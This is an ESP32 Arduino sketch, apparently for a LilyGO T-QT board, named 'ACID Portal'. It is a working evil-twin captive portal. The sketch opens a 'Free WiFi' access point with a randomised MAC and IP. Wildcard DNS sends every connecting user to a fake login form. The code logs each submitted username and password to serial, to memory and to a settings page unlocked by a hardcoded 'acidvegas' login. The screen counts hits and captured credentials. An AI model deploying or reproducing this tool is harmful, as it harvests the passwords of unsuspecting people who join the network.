// Main Includes
#include <vector>

// Arduino Libraries
#include <Arduino.h>
#include <AsyncTCP.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <esp_system.h> 
#include "OneButton.h"
#include <Preferences.h>
#include <TFT_eSPI.h>
#include <WiFi.h>


// T-QT Pins
#define PIN_BAT_VOLT  4
#define PIN_LCD_BL   10
#define PIN_BTN_L     0
#define PIN_BTN_R    47


AsyncWebServer server(80);
DNSServer dnsServer;
IPAddress apIP;
OneButton btn_left(PIN_BTN_L, true);
OneButton btn_right(PIN_BTN_R, true);
Preferences preferences;
std::vector<String> loginAttempts;
String ssid;
TFT_eSPI tft = TFT_eSPI(128, 128); // Default size for the T-QT

bool displayOn = true;
int hits = 0;
int marqueePosition = 0;
unsigned long lastMarqueeUpdate = 0;


void buttonLeftPressed() {
	if (displayOn) {
		digitalWrite(PIN_LCD_BL, LOW);
		displayOn = false;
	} else {
		digitalWrite(PIN_LCD_BL, HIGH);
		displayOn = true;
	}
}


String formatNumber(int num) {
	String str = String(num);
	int len = str.length();
	String formatted = "";

	for (int i = 0; i < len; i++) {
		if (i > 0 && (len - i) % 3 == 0)
			formatted += ",";
		formatted += str[i];
	}

	return formatted;
}


IPAddress getRandomIPAddress() {
	while (true) {
		byte octet1 = random(1, 224); // Avoid 0 & 224-255 (multicast/reserved)
		byte octet2 = random(0, 256);
		byte octet3 = random(0, 256);
		byte octet4 = random(1, 255); // Avoid 0 (network) & 255 (broadcast)

		// Avoid private IP ranges
		if (octet1 == 10) continue; // 10.0.0.0/8
		if (octet1 == 172 && octet2 >= 16 && octet2 <= 31) continue; // 172.16.0.0/12
		if (octet1 == 192 && octet2 == 168) continue; // 192.168.0.0/16

		// Avoid other reserved ranges
		if (octet1 == 127) continue; // Loopback
		if (octet1 == 169 && octet2 == 254) continue; // Link-local
		if (octet1 == 192 && octet2 == 0 && octet3 == 2) continue; // Test-Net-1
		if (octet1 == 198 && (octet2 == 51 || octet2 == 18)) continue; // Test-Net-2 and Test-Net-3
		if (octet1 >= 224) continue; // Class D and E

		return IPAddress(octet1, octet2, octet3, octet4);
	}
}


void handleClearAttempts(AsyncWebServerRequest *request) {
	loginAttempts.clear();
	updateDisplaySSID();
	request->redirect("/settings");
}


void handleLogin(AsyncWebServerRequest *request) {
	String username = request->arg("username");
	String password = request->arg("password");
	
	Serial.println("Login attempt: " + username + ":" + password);

	loginAttempts.push_back(username + ":" + password);
	updateDisplaySSID();
	
	if (username == "acidvegas" && password == "acidvegas")
		request->redirect("/settings");
	else
		request->send(200, "text/html", "<html><body><h1>Login received</h1></body></html>");
}


void handleRoot(AsyncWebServerRequest *request) {
	String html = "<html>"
		"	<body>"
		"		<h1>Welcome to " + ssid + "</h1>"
		"		<form action='/' method='post'>"
		"			Username: <input type='text' name='username' maxlength='100'><br>"
		"			Password: <input type='password' name='password' maxlength='100'><br>"
		"			<input type='submit' value='Log In'>"
		"		</form>"
		"	</body>"
		"</html>";

	request->send(200, "text/html", html);

	hits++;
}


void handleSettings(AsyncWebServerRequest *request) {
	String html = "<html>"
		"	<body>"
		"		<h1>Settings</h1>"
		"		<form action='/settings' method='post'>"
		"			New SSID: <input type='text' name='new_ssid' minlength='1' maxlength='32'><br>"
		"			<input type='submit' value='Update SSID'>"
		"		</form>"
		"		<form action='/clear' method='post'>"
		"			<input type='submit' value='CLEAR Login Attempts'>"
		"		</form>"
		"		<h2>Login Attempts:</h2>";
	
	for (const auto& attempt : loginAttempts)
		html += "		" + attempt + "<br>";
	
	html += "	</body>";
	html += "</html>";
	
	request->send(200, "text/html", html);
}


void handleUpdateSSID(AsyncWebServerRequest *request) {
	String newSSID = request->arg("new_ssid");

	if (newSSID.length() > 0 && newSSID.length() <= 32) {
		ssid = newSSID;
		preferences.putString("ssid", ssid);

		setupWiFiAP();

		marqueePosition = 0;
		updateDisplaySSID();

		request->redirect("/settings");
	} else {
		String html = "<html>"
			"	<body>"
			"		<h1>Error</h1>"
			"		<p>SSID must be between 1 and 32 characters.</p>"
			"		<a href='/settings'>Back to Settings</a>"
			"	</body>"
			"</html>";

		request->send(400, "text/html", html);
	}
}


void loadPreferences() {
	Serial.println("Loading preferences...");
	preferences.begin("config", false);
	ssid = preferences.getString("ssid", "Free WiFi");
	Serial.println("SSID loaded: " + ssid);
}


void loop() {
	dnsServer.processNextRequest();
	updateMarquee();
	btn_left.tick();
	btn_right.tick();
	
	delay(50);
}


void setRandomMAC() {
	uint8_t mac[6];

	mac[0] = 0x02; // Locally administered address (use 0x00 for global)
	mac[1] = random(0, 256);
	mac[2] = random(0, 256);
	mac[3] = random(0, 256);
	mac[4] = random(0, 256);
	mac[5] = random(0, 256);

	esp_base_mac_addr_set(mac);

	if (esp_base_mac_addr_get(mac) == ESP_OK)
		Serial.println("Random MAC address set to " + String(mac[0], HEX) + ":" + String(mac[1], HEX) + ":" + String(mac[2], HEX) + ":" + String(mac[3], HEX) + ":" + String(mac[4], HEX) + ":" + String(mac[5], HEX));
	else
		Serial.println("Failed to set MAC address.");
}


void setup() {
	Serial.begin(115200);
	Serial.println("Starting ACID Portal...");

	Serial.println("Generating random seed...");
	uint32_t seed = esp_random();
	randomSeed(seed);

	loadPreferences();

	setupWiFiAP();
	setupServer();

	Serial.println("Initializing display...");
	tft.begin();

	updateDisplaySSID();

	btn_left.attachClick(buttonLeftPressed);
	//btn_right.attachClick(CHANGEME);
}


void setupServer() {
	Serial.println("Starting DNS server...");
	dnsServer.start(53, "*", apIP);
	
	Serial.println("Setting up the HTTP server...");
	server.on("/", HTTP_GET, handleRoot);
	server.on("/", HTTP_POST, handleLogin);
	server.on("/settings", HTTP_GET, handleSettings);
	server.on("/settings", HTTP_POST, handleUpdateSSID);
	server.on("/clear", HTTP_POST, handleClearAttempts);
	server.onNotFound([](AsyncWebServerRequest *request) {
		request->redirect("http://" + apIP.toString());
	});
	server.begin();
	Serial.println("HTTP server started.");
}


void setupWiFiAP() {
	if (WiFi.softAPgetStationNum() > 0) {
		Serial.println("Shutting down existing access point...");
        WiFi.softAPdisconnect(true);
	}

	setRandomMAC();

	apIP = getRandomIPAddress();
	Serial.println("Using IP address: " + apIP.toString());

	WiFi.mode(WIFI_AP);
	WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
	WiFi.softAP(ssid.c_str());

	Serial.println("Access Point (" + ssid + ") started on " + WiFi.softAPIP());
}


void updateDisplaySSID() {
	tft.fillScreen(TFT_BLACK);

	tft.setTextSize(2);
	tft.setTextColor(TFT_GREEN);

	int textWidth = tft.textWidth("ACID");
	int xPos = (tft.width() - textWidth) / 2;
	tft.setCursor(xPos, 5);
	tft.println("ACID");

	textWidth = tft.textWidth("PORTAL");
	xPos = (tft.width() - textWidth) / 2;
	tft.setCursor(xPos, 25);
	tft.println("PORTAL");

	tft.setTextSize(1);

	String ipString = WiFi.softAPIP().toString();
	textWidth = tft.textWidth(ipString);
	xPos = (tft.width() - textWidth) / 2;
	int yPos = (tft.height() - 16) / 2;
	tft.setCursor(xPos, yPos);
	tft.setTextColor(TFT_PURPLE);
	tft.print(ipString);

	String hitCount = formatNumber(hits) + " hits";
	textWidth = tft.textWidth(hitCount);
	xPos = (tft.width() - textWidth) / 2;
	tft.setCursor(xPos, yPos + 10);
	tft.setTextColor(TFT_CYAN);
	tft.print(hitCount);

	String credentialCount = formatNumber(loginAttempts.size()) + " logs";
	textWidth = tft.textWidth(credentialCount);
	xPos = (tft.width() - textWidth) / 2;
	tft.setCursor(xPos, yPos + 20);
	tft.setTextColor(TFT_CYAN);
	tft.print(credentialCount);

	marqueePosition = 0;

	// Clear the bottom portion of the screen for the marquee
	tft.fillRect(0, tft.height() - 12, tft.width(), 12, TFT_BLACK);
}


void updateMarquee() {
	unsigned long currentTime = millis();
	if (currentTime - lastMarqueeUpdate >= 50) {
		lastMarqueeUpdate = currentTime;
		
		// Clear the bottom portion of the screen
		tft.fillRect(0, tft.height() - 10, tft.width(), 10, TFT_BLACK);
		
		int textWidth = tft.textWidth(ssid);
		int startX = tft.width() - marqueePosition;
		
		// Draw the text only if it's on screen
		if (startX < tft.width()) {
			tft.setCursor(startX, tft.height() - 10);
			tft.setTextWrap(false);  // Prevent text wrapping
			tft.setTextColor(TFT_YELLOW);
			tft.print(ssid);
		}
		
		marqueePosition++;

		if (marqueePosition > textWidth + tft.width())
			marqueePosition = 0;
	}
}